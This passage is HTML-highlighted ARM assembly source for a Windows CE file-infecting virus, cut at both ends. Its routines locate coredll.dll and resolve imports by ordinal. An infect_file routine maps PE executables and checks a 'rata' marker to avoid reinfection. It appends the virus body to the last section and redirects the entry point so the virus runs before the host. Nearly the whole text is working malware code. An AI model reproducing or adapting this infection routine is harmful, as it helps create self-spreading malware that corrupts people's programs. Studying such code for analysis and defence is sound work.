   </span><span class="sc5">ldreq</span><span class="sc0">   </span><span class="sc5">r7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x7c</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get dll base</span><span class="sc0">
   </span><span class="sc5">ldreq</span><span class="sc0">   </span><span class="sc5">r8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x8c</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get export section rva</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r8</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">got_coredllbase</span><span class="sc0">    </span><span class="sc1">; is it what we're looking for?</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">cmpne</span><span class="sc0">   </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc0">
   </span><span class="sc5">bne</span><span class="sc0">    </span><span class="sc5">iterate</span><span class="sc0">        </span><span class="sc1">; nope, go on</span><span class="sc0">

</span><span class="sc5">got_coredllbase</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r7</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r7</span><span class="sc0">      </span><span class="sc1">; yep, we've got imagebase</span><span class="sc0">
                   </span><span class="sc1">; and export section pointer</span><span class="sc0">

   </span><span class="sc5">ldmia</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc0">!</span><span class="sc4">,</span><span class="sc0"> {</span><span class="sc5">r4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">r9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">}
   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">coredll</span><span class="sc0">   </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"c"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"o"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"r"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"e"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"d"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"l"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"l"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
      </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"d"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"l"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"l"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">

</span><span class="sc1">; r0 - coredll base addr</span><span class="sc0">
</span><span class="sc1">; r1 - export section addr</span><span class="sc0">
</span><span class="sc1">; r2 - import ordinals array</span><span class="sc0">
</span><span class="sc1">; r3 - where to store function adrs</span><span class="sc0">
</span><span class="sc5">lookup_imports</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc5">stmdb</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc0">!</span><span class="sc4">,</span><span class="sc0"> {</span><span class="sc5">r4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc0">}

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x10</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; gimme ordinal base</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x1c</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; gimme Export Address Table</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">

</span><span class="sc5">lookup_imports_iterate</span><span class="sc0">
   </span><span class="sc5">ldrh</span><span class="sc0">   </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r2</span><span class="sc4">],</span><span class="sc0"> #</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; gimme ordinal</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; last value?</span><span class="sc0">

   </span><span class="sc5">subne</span><span class="sc0">   </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc0">      </span><span class="sc1">; substract ordinal base</span><span class="sc0">
   </span><span class="sc5">ldrne</span><span class="sc0">   </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">LSL</span><span class="sc0"> #</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; gimme export RVA</span><span class="sc0">
   </span><span class="sc5">addne</span><span class="sc0">   </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">      </span><span class="sc1">; add imagebase</span><span class="sc0">
   </span><span class="sc5">strne</span><span class="sc0">   </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r3</span><span class="sc4">],</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">     </span><span class="sc1">; store function address</span><span class="sc0">
   </span><span class="sc5">bne</span><span class="sc0">    </span><span class="sc5">lookup_imports_iterate</span><span class="sc0">

   </span><span class="sc5">ldmia</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">!</span><span class="sc4">,</span><span class="sc0"> {</span><span class="sc5">r4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">}
   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">; r0 - filename</span><span class="sc0">
</span><span class="sc1">; r1 - filesize</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc5">stmdb</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc0">!</span><span class="sc4">,</span><span class="sc0"> {</span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc0">}

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">

   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">open_file</span><span class="sc0">       </span><span class="sc1">; first open the file for mapping</span><span class="sc0">
   </span><span class="sc5">cmn</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">infect_file_end</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; store the handle</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc0">        </span><span class="sc1">; now create the mapping with</span><span class="sc0">
                   </span><span class="sc1">; maximum size == filesize</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">create_mapping</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">infect_file_end_close_file</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; store the handle</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">map_file</span><span class="sc0">       </span><span class="sc1">; map the whole file</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">infect_file_end_close_mapping</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">

   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">check_header</span><span class="sc0">     </span><span class="sc1">; is it file that we can infect?</span><span class="sc0">
   </span><span class="sc5">bne</span><span class="sc0">    </span><span class="sc5">infect_file_end_unmap_view</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x4c</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; check the reserved field in</span><span class="sc0">
                   </span><span class="sc1">; optional header against</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc2">0x72617461</span><span class="sc0">    </span><span class="sc1">; rata</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">        </span><span class="sc1">; already infected?</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">infect_file_end_unmap_view</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x3c</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; gimme filealignment</span><span class="sc0">
   </span><span class="sc5">adr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
   </span><span class="sc5">adr</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc0">     </span><span class="sc1">; compute virus size</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">        </span><span class="sc1">; r7 now holds virus_size</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">_align_</span><span class="sc0">        </span><span class="sc1">; add it to filesize and</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">        </span><span class="sc1">; align it to filealignment</span><span class="sc0">
                   </span><span class="sc1">; r6 holds the new filesize</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; UnmapViewOfFile</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; close mapping handle</span><span class="sc0">

   </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r8</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">open_file</span><span class="sc0">       </span><span class="sc1">; reopen the file because via</span><span class="sc0">
                   </span><span class="sc1">; closing the mapping handle file</span><span class="sc0">
                   </span><span class="sc1">; handle was closed too</span><span class="sc0">
   </span><span class="sc5">cmn</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">infect_file_end</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r6</span><span class="sc0">        </span><span class="sc1">; create mapping again with the</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">create_mapping</span><span class="sc0">    </span><span class="sc1">; new filesize (with virus appended)</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">infect_file_end_close_file</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r6</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">map_file</span><span class="sc0">       </span><span class="sc1">; map it</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">infect_file_end_close_mapping</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">
   </span><span class="sc1">;</span><span class="sc0">

   </span><span class="sc1">; r5 - mapping base</span><span class="sc0">
   </span><span class="sc1">; r7 - virus_size</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x3c</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get PE signature offset</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc0">      </span><span class="sc1">; add the base</span><span class="sc0">

   </span><span class="sc5">ldrh</span><span class="sc0">   </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get NumberOfSections</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; we want the last section header</span><span class="sc0">
                   </span><span class="sc1">; so dec</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x28</span><span class="sc0">       </span><span class="sc1">; multiply with section header size</span><span class="sc0">
   </span><span class="sc6">mul</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r2</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc0">      </span><span class="sc1">; add optional header start to displacement</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x78</span><span class="sc0">     </span><span class="sc1">; add optional header size</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x74</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get number of data directories</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">LSL</span><span class="sc0"> #</span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">; multiply with sizeof(data_directory)</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">      </span><span class="sc1">; add it because section headers</span><span class="sc0">
                   </span><span class="sc1">; start after the optional header</span><span class="sc0">
                   </span><span class="sc1">; (including data directories)</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x28</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; gimme entrypoint rva</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x10</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get last section's size of rawdata</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x14</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; and pointer to rawdata</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r2</span><span class="sc0">      </span><span class="sc1">; compute pointer to the first</span><span class="sc0">
                   </span><span class="sc1">; byte available for us in the</span><span class="sc0">
                   </span><span class="sc1">; last section</span><span class="sc0">
                   </span><span class="sc1">; (pointer to rawdata + sizeof rawdata)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">        </span><span class="sc1">; r9 now holds the pointer</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0xc</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get RVA of section start</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r8</span><span class="sc0">      </span><span class="sc1">; add sizeof rawdata</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x28</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; set entrypoint</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r3</span><span class="sc0">      </span><span class="sc1">; now compute the displacement so that</span><span class="sc0">
                   </span><span class="sc1">; we can later jump back to the host</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">8</span><span class="sc0">      </span><span class="sc1">; sub 8 because pc points to</span><span class="sc0">
                   </span><span class="sc1">; fetched instruction (viz LTORG)</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r10</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x10</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; get size of raw data again</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r7</span><span class="sc0">      </span><span class="sc1">; add virus size</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x3c</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">_align_</span><span class="sc0">        </span><span class="sc1">; and align</span><span class="sc0">

   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r10</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x10</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; store new size of rawdata</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r10</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; store new virtual size</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r10</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0xc</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get virtual address of last section</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">      </span><span class="sc1">; add size so get whole image size</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x50</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; and store it</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc2">0x60000020</span><span class="sc0">    </span><span class="sc1">; IMAGE_SCN_CNT_CODE | MAGE_SCN_MEM_EXECUTE |</span><span class="sc0">
                   </span><span class="sc1">; IMAGE_SCN_MEM_READ</span><span class="sc0">
